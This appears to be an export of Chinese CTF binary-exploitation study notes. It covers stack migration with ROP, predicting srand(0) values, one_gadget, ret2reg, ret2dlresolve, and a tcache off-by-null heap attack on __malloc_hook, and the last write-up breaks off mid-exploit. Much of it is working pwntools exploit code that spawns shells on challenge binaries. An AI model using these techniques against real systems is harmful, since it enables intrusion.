exp<span class="token punctuation">(</span><span class="token punctuation">)</span>


io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://s2.loli.net/2024/08/19/z3ycv8rTofaMYet.png" alt="562e8677d3b043189857f82b2ece78ba.png"></p>
<h5 id="4，rand"><a href="#4，rand" class="headerlink" title="4，rand"></a>4，rand</h5><p>伪随机数，多执行了几次。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> 
    lib <span class="token operator">=</span> cdll<span class="token punctuation">.</span>LoadLibrary<span class="token punctuation">(</span><span class="token string">"/usr/lib/x86_64-linux-gnu/libc.so.6"</span><span class="token punctuation">)</span>
    lib<span class="token punctuation">.</span>srand<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        v4 <span class="token operator">=</span> lib<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">100</span><span class="token operator">+</span><span class="token number">1</span>
        ru<span class="token punctuation">(</span><span class="token string">"Give me you number~~~\n"</span><span class="token punctuation">)</span>
        sl<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>v4<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

exp<span class="token punctuation">(</span><span class="token punctuation">)</span>


io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://s2.loli.net/2024/08/19/yOhApl7KuPn34f5.png" alt="7b50e040e7d44fe1aae2186861905606.png"></p>
<h5 id="5，stack-migration"><a href="#5，stack-migration" class="headerlink" title="5，stack_migration"></a>5，stack_migration</h5><p>栈迁移，迁移回栈上执行构造的rop链</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> 
    ru<span class="token punctuation">(</span><span class="token string">"here ["</span><span class="token punctuation">)</span>
    buf <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>

    pop_rdi <span class="token operator">=</span> <span class="token number">0x4012d3</span>
    ret <span class="token operator">=</span> <span class="token number">0x40101a</span>
    system <span class="token operator">=</span> <span class="token number">0x401090</span>
    leave_ret <span class="token operator">=</span> <span class="token number">0x401264</span>
    lg<span class="token punctuation">(</span><span class="token string">"buf"</span><span class="token punctuation">,</span>buf<span class="token punctuation">)</span>

    pl <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0xa</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>buf<span class="token operator">+</span><span class="token number">0x28</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'/bin/sh\x00'</span>
    pl <span class="token operator">=</span> pl<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span>
    pl <span class="token operator">+=</span> p64<span class="token punctuation">(</span>buf<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">" it!\n"</span><span class="token punctuation">)</span>
    s<span class="token punctuation">(</span>pl<span class="token punctuation">)</span>
    <span class="token comment"># gdb()</span>
exp<span class="token punctuation">(</span><span class="token punctuation">)</span>


io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://s2.loli.net/2024/08/19/ZQMTLc4iVNIoryl.png" alt="744729e82978420d84eeca744fdc8c97.png"></p>
]]></content>
      <categories>
        <category>做题笔记</category>
        <category>积累</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>Heap</tag>
      </tags>
  </entry>
  <entry>
    <title>关于One_gadget</title>
    <url>/2024/04/19/%E5%85%B3%E4%BA%8Eone-gadget/</url>
    <content><![CDATA[<h2 id="题目描述存在用户输入获取函数指针，并通过函数指针调用相应的函数。需要注意的是，这种通过用户输入来获取函数指针并调用函数的做法极其危险。"><a href="#题目描述存在用户输入获取函数指针，并通过函数指针调用相应的函数。需要注意的是，这种通过用户输入来获取函数指针并调用函数的做法极其危险。" class="headerlink" title="题目描述存在用户输入获取函数指针，并通过函数指针调用相应的函数。需要注意的是，这种通过用户输入来获取函数指针并调用函数的做法极其危险。"></a>题目描述存在用户输入获取函数指针，并通过函数指针调用相应的函数。需要注意的是，这种通过用户输入来获取函数指针并调用函数的做法极其危险。</h2><p>one_gadget是libc中存在的一些执行execve(“bin&#x2F;sh”,NULL,NULL)的片段，当可以泄露libc地址，并且可以知道libc版本的时候，可以使用此方法来快速控制指令寄存器开始shell。相当于system(“&#x2F;bin&#x2F;sh”)，这种方式更方便，不用控制RDI，RSI，RDX等寄存器。</p>
<p>安装方式</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token parameter variable">-y</span> <span class="token function">install</span> ruby
<span class="token function">sudo</span> gem <span class="token function">install</span> one_gadget<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>使用方法</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">one_gadget libc.so.6<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>one_gadget并不总是可以获取shell，它首先要满足一些条件才能执行成功。</p>
]]></content>
      <categories>
        <category>思考</category>
      </categories>
      <tags>
        <tag>PWN</tag>
        <tag>Binary</tag>
      </tags>
  </entry>
  <entry>
    <title>关于Python3如何实现base64编码解码</title>
    <url>/2024/04/19/%E5%85%B3%E4%BA%8Epython3%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0base64%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81/</url>
    <content><![CDATA[<p><img src="https://s2.loli.net/2024/04/19/B2j1kgEqVI8FYbu.png" alt="image-20240419114231543.png"></p>
<p>AttributeError: ‘bytes’ object has no attribute ‘encode’是：“字节”对象没有属性的编码的意思。</p>
<p>很明显，是编码格式的问题。</p>
<p>使用.encode(“base64”)在python3中会报错。b64encode函数的参数为byte类型，而python3中字符都是unicode编码，所以在进行base64编码之前必须先转码。base64生成的编码都是ascii字符。</p>
<p>解一般的pwn题目的方式。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">payload_ <span class="token operator">=</span> <span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>源码</p>
<p><img src="https://s2.loli.net/2024/04/19/SPQ7A8uUGEICTZe.png" alt="image-20240419120225364.png"></p>
<p>执行结果</p>
<p><img src="https://s2.loli.net/2024/04/19/pUEQFSbCgWKDiLo.png" alt="image-20240419120244744.png"></p>
]]></content>
      <categories>
        <category>学习</category>
      </categories>
      <tags>
        <tag>Binary</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>实验室看到的一个问题</title>
    <url>/2024/04/21/%E5%AE%9E%E9%AA%8C%E5%AE%A4%E7%9C%8B%E5%88%B0%E7%9A%84%E4%B8%80%E4%B8%AA%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<p><img src="https://s2.loli.net/2024/04/21/wLnhEU6yuDTf3le.png" alt="1.PNG"><br>可以先思考思考为啥？学弟问的问题，明显就是没有做好交互，但为啥会一起发送呢？</p>
<p>我去网上找了找相关知识，<br><img src="https://s2.loli.net/2024/04/21/MFfi7To1BIbtOVg.png" alt="B12262FE6DF289C7494B2771A7C12E24.png"></p>
<p>突然来了点思路，但还是不确定，不如自己去写过c程序试试呗。<br><img src="https://s2.loli.net/2024/04/21/QPwT1Lpy5mMtZSx.png" alt="2.PNG"></p>
<p>源码如下：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;unistd.h></span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">char</span><span class="token operator">*</span> buf<span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> nbytes<span class="token punctuation">;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+]Please inputs the length of your name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>nbytes<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+]What's u name?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>buf<span class="token punctuation">,</span>nbytes<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>结合scanf遇到空格符会停下，我构造payload</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">payload <span class="token operator">=</span> <span class="token string">b'-1'</span> <span class="token operator">+</span> <span class="token string">b'\x0a'</span> <span class="token operator">+</span> <span class="token string">b'aaaaaaaaaaaaaaaaaaaa'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>


<p><img src="https://s2.loli.net/2024/04/21/wPSvWbhEo23Nrkd.png" alt="3.PNG"></p>
<p>可以看到换行符后面的内容也读入进去了。</p>
<p>现在回来看看问题。猜测会不会是scanf和read的缓冲区不一样呢？<br><img src="https://s2.loli.net/2024/04/21/ECs57NwIuekXQ2D.png" alt="4.PNG"></p>
<p>问了问chatgpt，得到了准确的答案。我也学习到了，io流和标准输入流的缓冲区不一样。</p>
<p>下次还是要做好交互吧！</p>
]]></content>
      <categories>
        <category>思考</category>
      </categories>
      <tags>
        <tag>PWN</tag>
        <tag>Binary</tag>
      </tags>
  </entry>
  <entry>
    <title>浅谈Ret2reg的理解</title>
    <url>/2024/04/20/%E6%B5%85%E8%B0%88Ret2reg%E7%9A%84%E7%90%86%E8%A7%A3/</url>
    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>1，查看栈溢出返回时哪个寄存器指向缓冲区空间。</p>
<p>2，查看对应的call寄存器或jmp寄存器指令，将IP设置为该指令地址。</p>
<p>3，将寄存器所指向的空间上注入shellcode（该空间是可执行的，通常是栈上）</p>
<p>4，一般解题该漏洞的特点是存在危险函数strcpy的字符串拷贝函数</p>
<h2 id="解题一般步骤"><a href="#解题一般步骤" class="headerlink" title="解题一般步骤"></a>解题一般步骤</h2><p>1，检查保护存在RWX segments</p>
<p>2，使用gdb调试程序，看看那些寄存器是指向缓冲区的</p>
<p>3，在利用</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ROPgadget <span class="token parameter variable">--binary</span> vuln <span class="token parameter variable">--only</span> <span class="token string">"call"</span>
ROPgadget <span class="token parameter variable">--binary</span> vuln <span class="token parameter variable">--only</span> <span class="token string">"jmp"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>4,栈布局</p>
<p><img src="https://s2.loli.net/2024/04/20/JhgWtfbFX9EemaO.png" alt=".PNG"></p>
]]></content>
      <categories>
        <category>学习</category>
      </categories>
      <tags>
        <tag>PWN</tag>
        <tag>Binary</tag>
        <tag>ROP</tag>
      </tags>
  </entry>
  <entry>
    <title>浅谈Ret2dlresolve</title>
    <url>/2024/04/20/%E6%B5%85%E8%B0%88ret2dlresolve/</url>
    <content><![CDATA[<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>在linux中，程序使用_dl_runtime_resolve(link_map_obj,reloc_offset)来进行动态链接的函数进行重定位。那么如果我们可以控制相应的参数及其对应地址的内容是不是就可以直接控制解析的函数了。具体就是利用动态链接器在解析符号地址时所使用的重定位表项、动态符号表、动态符号串都是从目标文件中的动态节.dynamic索引得到的。所以如果我们能够修改其中的某些内容使得最后动态链接器解析的符号是我们想要解析的符号，那就攻击成功。</p>
<h2 id="基础知识-延迟绑定"><a href="#基础知识-延迟绑定" class="headerlink" title="基础知识-延迟绑定"></a>基础知识-延迟绑定</h2><p>思考思考，在linux中一个函数是如何正常运行的呢？</p>
]]></content>
      <categories>
        <category>学习</category>
      </categories>
      <tags>
        <tag>ROP</tag>
        <tag>ret2dlresolve</tag>
      </tags>
  </entry>
  <entry>
    <title>高版本Tcache+off-by-One（二）</title>
    <url>/2024/07/25/%E9%AB%98%E7%89%88%E6%9C%ACtcache-off-by-one%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    <content><![CDATA[<h5 id="程序的保护"><a href="#程序的保护" class="headerlink" title="程序的保护"></a>程序的保护</h5><p>感觉基本的大部分的heap题目都是全部开的。有时候要是他少了个保护，我都会感觉这题难到飞起。这题是18.04的环境也就是2.27。</p>
<p><img src="https://s2.loli.net/2024/08/19/9mhqbnyewgPORpu.png" alt="f058a21f6cbe4a6ea67f97e142c4484f.png"></p>
<h5 id="分析伪c函数"><a href="#分析伪c函数" class="headerlink" title="分析伪c函数"></a>分析伪c函数</h5><p>main函数就是正常的菜单题，但是没有edit函数这就很烦人。</p>
<p><img src="https://s2.loli.net/2024/08/19/wjLp4JHD13o9GKN.png" alt="7431b927b42e40b8ac9e7cb268286b08.png"></p>
<p>delete函数，我只能说它删的很干净，一点不给我机会（uaf）</p>
<p><img src="https://s2.loli.net/2024/08/19/mP9kM5xFfiQOGIq.png" alt="1e15a6829cdf40eab5ed7e2d90958a82.png"></p>
<p>show函数也很正常吧。</p>
<p><img src="https://s2.loli.net/2024/08/19/nHTBOP8Rayt3hjr.png" alt="90571b06f75c43019439410765c68c1c.png"></p>
<p>add函数里面的sub_BC8()和calloc值得我们注意一下，且申请的chunk大小不能大于0x100</p>
<p><img src="https://s2.loli.net/2024/08/19/f7hGrczRO5jYwAx.png" alt="ab2d9a45d8ba4a569bfd9d9cb0ac6fc0.png"></p>
<p>sub_BC8函数是写入函数。但是呢，存在off-by-null</p>
<p><img src="https://s2.loli.net/2024/08/19/2YXtqQEZP6aHjeB.png" alt="0a4e27df127d4b559895f39668fc45e4.png"></p>
<p>下面说说那个calloc(v0, 1uLL)，记得calloc不会从tcache中寻找合适的分配，只会从fast bin,small bin, unsorted bin来分配就行。</p>
<h5 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h5><p>利用那个off-by-null将堆重叠，通过unsortbins从而泄露libc地址。后面将chunk申请到__malloc_hook上面的方法似乎我是一步步调试出来的，不算具体什么方法。应该属于堆风水（随缘打法）但是成功了。</p>
<h5 id="分析思路"><a href="#分析思路" class="headerlink" title="分析思路"></a>分析思路</h5><p>1，万事开头难，第一步我当时也没搞对。但是吧，高版本libc有tcache一般都是后面慢慢调试更改的。先将后面会利用到的一定size的chunk对应的Tcache给填满。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span><span class="token number">0xf0</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">)</span><span class="token comment">#0-6</span>
    add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span><span class="token comment">#7-13</span>
    add<span class="token punctuation">(</span><span class="token number">0xa0</span><span class="token punctuation">,</span><span class="token string">'cccc'</span><span class="token punctuation">)</span><span class="token comment">#14 - 20</span>
    add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">'t'</span><span class="token punctuation">)</span><span class="token comment">#21 - 27</span>

add<span class="token punctuation">(</span><span class="token number">0xf8</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span><span class="token comment">#28</span>
add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span><span class="token comment">#29</span>
add<span class="token punctuation">(</span><span class="token number">0xf0</span><span class="token punctuation">,</span><span class="token string">'cccc'</span><span class="token punctuation">)</span><span class="token comment">#30</span>
add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span><span class="token string">'dddd'</span><span class="token punctuation">)</span><span class="token comment">#31</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">28</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    free<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token comment">#0-27被free掉了</span>
<span class="token comment">#将上面将对应大小的tcache填满</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>此时的bins</p>
<p><img src="https://s2.loli.net/2024/08/19/fnQSkxe4JmawHZC.png" alt="488481879b4a4cecb6ab8e944bde0af7.png"></p>
<p>2，先将序号为28和29的chunk给free掉，再申请回来序号为29的chunk（因为先进后出）将序号为30的pre_size位修改为0x120（为序号28和29的size和），再通过off-by-one漏洞，将序号为30的size的低一字节改为”\x00”，再将其free掉就会造成堆重叠。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">free<span class="token punctuation">(</span><span class="token number">28</span><span class="token punctuation">)</span>
free<span class="token punctuation">(</span><span class="token number">29</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x10</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x120</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#0</span>
free<span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>修改pre_size和size位。</p>
<p><img src="https://s2.loli.net/2024/08/19/h58xsDEa7zwgG91.png" alt="e6557ee188ff4dbc8364a8fb8f506b9a.png"></p>
<p>此时因为free机制，就会将这三个chunk合并free掉，总的size为0x220为这三个的和</p>
<p><img src="https://s2.loli.net/2024/08/19/WfIiaoHQ7hw89LV.png" alt="d32b5e0b76654c7f9e8d69de434cd462.png"></p>
<p>3，此时这个大的freechunk是再unsortbins里面的（因为tcache里面那三个小chunk对应的size已经被填满了），此时我们再将前面的序号为28的chunk给申请回来。因为程序使用的是calloc不会调用tcache里面的chunk，又因为unsortbins里面有chunk且大小够所以从中切割，不然从top_chunk里面切割。之后就会发现之前所覆盖的chunk里面被写上了unsortbins_addr，接下来show一下，就会泄露信息</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">0xf0</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span><span class="token comment">#1</span>

show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

leak_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
main_arenas <span class="token operator">=</span> leak_addr <span class="token operator">-</span> <span class="token number">0x60</span>
__malloc_hook <span class="token operator">=</span> main_arenas <span class="token operator">-</span> <span class="token number">0x10</span>
libc_base <span class="token operator">=</span> __malloc_hook <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"__malloc_hook"</span><span class="token punctuation">]</span>
__free_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"__free_hook"</span><span class="token punctuation">]</span>
fake_chunk <span class="token operator">=</span> __malloc_hook <span class="token operator">-</span> <span class="token number">0x23</span>

log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'leak_addr = </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>leak_addr<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'main_arenas = </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>main_arenas<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'__malloc_hook = </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>__malloc_hook<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'libc_base = </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'__free_hook = </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>__free_hook<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'fake_chunk = </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>fake_chunk<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>分割，往序号为0的chunk写入信息</p>
<p><img src="https://s2.loli.net/2024/08/19/zJxdmLUZipaluF7.png" alt="03c8fcd6d8f44f908ed7bcccd2d0e2b9.png"></p>
<p>这里的fake_chunk是我当时直接调试出来的位置。在__malloc_hook - 0x23位置</p>
<p><img src="https://s2.loli.net/2024/08/19/zqt6ULu8sBYCmya.png" alt="b55564ca6dcd46c4b1f039ba59575f0b.png"></p>
<p><img src="https://s2.loli.net/2024/08/19/JRnHfGgMi5zKckX.png" alt="d91bdaa716b244d398970448d370503d.png"></p>
<p>4，申请0x100的chunk，将前面的还处于unsortbins里面的chunk给申请出来。肯定有人和我一样疑惑为什么申请0x100就可以申请完了？那个chunk的size大小不是0x120嘛？但是您不能忘掉了，那个0x120是您自己伪造的，其实第三块chunk的大小就是0x100。在利用off-by-null和前面手法一样，只不过利用的size大小不一样（为了后面可以申请到fake_chunk处）。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span><span class="token comment">#2</span>

add<span class="token punctuation">(</span><span class="token number">0xf8</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span><span class="token comment">#3，此时chunk_3和chunk_0重叠了，不能用double free</span>
add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">'bbbb'</span><span class="token punctuation">)</span><span class="token comment">#4</span>
add<span class="token punctuation">(</span><span class="token number">0xf8</span><span class="token punctuation">,</span><span class="token string">'cccc'</span><span class="token punctuation">)</span><span class="token comment">#5</span>
add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span><span class="token comment">#6 隔离top chunk</span>

free<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
free<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x60</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x170</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#3</span>
free<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>5，此时，有点尴尬。序号为3的chunk其实被我们申请出来的。但是呢，它因为堆重叠，还在unsortbins里面。此时unsortbins里面其内存再开头处</p>
<p><img src="https://s2.loli.net/2024/08/19/gAfWK1q6EHOdRZh.png" alt="4f5d9e12c4314981870d1c3b37ecd192.png"></p>
<p>我们将序号为3的chunk给free掉，让其掉入fastbins里面。其也在unsortbins里面。是不是可以通过申请一个chunk来修改掉其fd指针从而可以伪造申请到我们所指定的位置</p>
<p><img src="https://s2.loli.net/2024/08/19/dncFRrphNHVkLv6.png" alt="8c5c556d9ab7494b891bf9bdb64afa12.png"></p>
<p>可以看到其之间相差0x100，因为我们不能直接申请0x100的chunk。所以通过两次申请chunk来修改fastbins里面chunk的fd指针。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">free<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token comment">#这一步导致其进入到fastbins里面</span>
add<span class="token punctuation">(</span><span class="token number">0xc0</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span><span class="token comment">#3</span>
